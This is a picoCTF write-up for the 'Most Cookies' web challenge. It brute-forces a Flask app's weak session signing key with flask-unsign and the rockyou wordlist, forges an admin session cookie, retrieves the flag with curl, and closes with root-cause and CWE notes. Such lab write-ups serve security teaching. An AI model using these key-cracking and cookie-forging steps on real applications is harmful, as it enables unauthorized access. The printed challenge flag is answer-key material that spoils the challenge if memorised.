# Most Cookies

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{cO0ki3s_yum_7ff5bad5}`

## Summary

A Flask app authorizes users based on a `very_auth` field stored in the signed `session` cookie
(Flask's default `itsdangerous`-signed client-side session). The app's `SECRET_KEY` is a weak,
guessable word present in common password wordlists. Brute forcing the signing key with
`flask-unsign` recovers it, allowing the session to be re-signed with `very_auth` changed to a
privileged value, which unlocks the flag page.

## Discovery

An initial request to `/` returns a 302 with a fresh session cookie:

```
Set-Cookie: session=eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.an8-gQ.0Pr7ARHCHcOpP0IkHSvHcPY9V2Y; HttpOnly; Path=/
```

Flask/`itsdangerous` cookies are `base64(payload).base64(timestamp).signature`. Decoding the
first segment confirms the structure and the target field:

```
$ echo eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9 | base64 -d
{"very_auth":"blank"}
```

The signature is an HMAC over the payload keyed by the server's `SECRET_KEY`. If that key is weak,
it can be brute forced entirely offline with `flask-unsign`, since forging a valid cookie only
requires knowing the key, not a live oracle.

```
$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.an8-gQ.0Pr7ARHCHcOpP0IkHSvHcPY9V2Y" \
    --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval
...
[+] Found secret key after 95488 attempts
b'shortbread'
```

(The bundled `flask-unsign[wordlist]` package, aimed at secrets leaked on GitHub/StackOverflow,
did not contain this key after 55,982 attempts; `rockyou.txt`, a general password list, did.)

## Proof of Concept

With the key known, forge a new cookie with `very_auth` changed from `blank` to `admin` and sign
it with the recovered key:

```
$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'shortbread'
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.an8_Ug.92QFwZPZlZ2RPz88tvjLD23c0G4
```

```
curl -s -i "http://TARGET/" \
  -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.an8_Ug.92QFwZPZlZ2RPz88tvjLD23c0G4"
```

```
HTTP/1.1 302 FOUND
Location: /display
```

```
curl -s "http://TARGET/display" \
  -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.an8_Ug.92QFwZPZlZ2RPz88tvjLD23c0G4"
```

```html
<p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{cO0ki3s_yum_7ff5bad5}</code></p>
```

## Root Cause

Flask's default session implementation is a client-side, cryptographically signed cookie, not a
server-side session store. Its confidentiality against tampering rests entirely on `SECRET_KEY`
being unguessable. A weak, dictionary-word key lets an attacker recover it offline via brute
force with no rate limiting or lockout possible (the attack never touches the live server), then
forge arbitrary session state, including authorization fields the app trusts implicitly.

## CWE / OWASP

- **CWE-321**: Use of Hard-coded Cryptographic Key
- **CWE-330**: Use of Insufficiently Random Values
- **CWE-807**: Reliance on Untrusted Inputs in a Security Decision (trusting client-supplied
  `very_auth` from a forgeable cookie)
- **OWASP A02:2021**: Cryptographic Failures
